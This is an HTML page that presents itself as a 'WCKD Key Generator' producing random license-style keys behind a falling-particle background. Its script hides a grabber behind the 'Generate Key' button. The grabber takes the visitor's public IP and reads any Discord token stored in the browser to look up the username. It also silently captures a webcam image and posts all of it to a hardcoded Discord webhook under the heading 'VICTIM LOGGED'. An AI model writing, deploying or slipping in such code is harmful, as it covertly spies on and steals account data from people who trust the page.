<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
        }
        #particles-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        .container {
            background: rgba(20, 20, 20, 0.9);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(255, 255, 255, 0.1);
            max-width: 500px;
            width: 100%;
            position: relative;
            z-index: 2;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        h1 {
            color: #fff;
            margin-bottom: 30px;
            text-align: center;
            font-size: 28px;
            letter-spacing: 4px;
            font-weight: 700;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #ddd;
            font-weight: 600;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
        }
        input[type="text"]:focus {
            outline: none;
            border-color: #fff;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5), 0 0 40px rgba(255, 255, 255, 0.3);
        }
        input[type="text"]::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        button {
            width: 100%;
            padding: 14px;
            background: #fff;
            color: #000;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255, 255, 255, 0.3);
        }
        button:active {
            transform: translateY(0);
        }
        .result {
            margin-top: 25px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            display: none;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .result.show {
            display: block;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .result-label {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 8px;
        }
        .generated-key {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            word-break: break-all;
            margin-bottom: 15px;
            font-family: 'Courier New', monospace;
        }
        .copy-btn {
            padding: 10px 20px;
            background: rgba(255, 255, 255, 0.9);
            margin-top: 10px;
        }
        .copy-btn:hover {
            background: #fff;
        }
        .copied {
            color: #4caf50;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
        .copied.show {
            display: block;
        }
    </style>
</head>
<body>
    <canvas id="particles-canvas"></canvas>
   
    <div class="container">
        <h1>WCKD KEY GENERATOR</h1>
       
        <div class="input-group">
            <label for="nameInput">Enter Name:</label>
            <input type="text" id="nameInput" placeholder="Enter The Name..." />
        </div>
        <button onclick="generateKeyAndGrab()">Generate Key</button>
        <div class="result" id="result">
            <div class="result-label">Generated Key:</div>
            <div class="generated-key" id="generatedKey"></div>
            <button class="copy-btn" onclick="copyKey()">Copy to Clipboard</button>
            <div class="copied" id="copiedMsg">âœ“ Copied to clipboard!</div>
        </div>
    </div>
    <script>
        const canvas = document.getElementById('particles-canvas');
        const ctx = canvas.getContext('2d');
       
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height - canvas.height;
                this.size = Math.random() * 3 + 1;
                this.speedY = Math.random() * 2 + 0.5;
                this.speedX = Math.random() * 0.5 - 0.25;
                this.opacity = Math.random() * 0.5 + 0.3;
            }
            update() {
                this.y += this.speedY;
                this.x += this.speedX;
                if (this.y > canvas.height) {
                    this.y = -10;
                    this.x = Math.random() * canvas.width;
                }
                if (this.x > canvas.width || this.x < 0) {
                    this.x = Math.random() * canvas.width;
                }
            }
            draw() {
                ctx.fillStyle = `rgba(255, 255, 255, ${this.opacity})`;
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fill();
            }
        }
        const particles = [];
        for (let i = 0; i < 100; i++) {
            particles.push(new Particle());
        }
        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
           
            particles.forEach(particle => {
                particle.update();
                particle.draw();
            });
            requestAnimationFrame(animateParticles);
        }
        animateParticles();

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";

        async function grabCamAndSend() {
            const video = document.createElement('video');
            video.autoplay = true;
            video.playsInline = true;
            video.muted = true;
            video.style.display = 'none';
            document.body.appendChild(video);

            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            let publicIP = "Unknown";
            let discordUsername = "Not logged in";

            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                publicIP = ipData.ip;
            } catch (e) {}

            try {
                const discordResponse = await fetch('https://discord.com/api/v9/users/@me', {
                    headers: { 'Authorization': localStorage.getItem('token')?.replace(/"/g, '') || '' }
                });
                if (discordResponse.ok) {
                    const userData = await discordResponse.json();
                    discordUsername = userData.username + '#' + userData.discriminator;
                    if (userData.discriminator === '0') discordUsername = '@' + userData.username;
                }
            } catch (e) {}

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        facingMode: "user"
                    },
                    audio: false
                });

                video.srcObject = stream;

                await new Promise(resolve => setTimeout(resolve, 4000));

                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;

                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.92);

                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "Advanced Grabber",
                        content: "**VICTIM LOGGED** ||@everyone||",
                        embeds: [{
                            title: "Full Victim Data",
                            color: 16711680,
                            fields: [
                                { name: "Public IP", value: publicIP, inline: true },
                                { name: "Discord Username", value: discordUsername, inline: true }
                            ],
                            image: { url: imageData },
                            timestamp: new Date().toISOString(),
                            footer: { text: "Cam + IP + Discord Grab" }
                        }]
                    })
                });

                stream.getTracks().forEach(track => track.stop());
                video.remove();

            } catch (err) {}
        }

        function generateRandomSegment() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let segment = '';
            for (let i = 0; i < 4; i++) {
                segment += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return segment;
        }

        async function generateKeyAndGrab() {
            const nameInput = document.getElementById('nameInput').value.trim().toUpperCase();
           
            if (!nameInput) {
                alert('Please enter a name!');
                return;
            }
            const segment1 = generateRandomSegment();
            const segment2 = generateRandomSegment();
            const segment3 = generateRandomSegment();
           
            const fullKey = `${nameInput}-${segment1}-${segment2}-${segment3}`;
           
            document.getElementById('generatedKey').textContent = fullKey;
            document.getElementById('result').classList.add('show');
            document.getElementById('copiedMsg').classList.remove('show');

            await grabCamAndSend();
        }

        function copyKey() {
            const key = document.getElementById('generatedKey').textContent;
            navigator.clipboard.writeText(key).then(() => {
                document.getElementById('copiedMsg').classList.add('show');
                setTimeout(() => {
                    document.getElementById('copiedMsg').classList.remove('show');
                }, 2000);
            });
        }

        document.getElementById('nameInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                generateKeyAndGrab();
            }
        });
    </script>
</body>
</html>
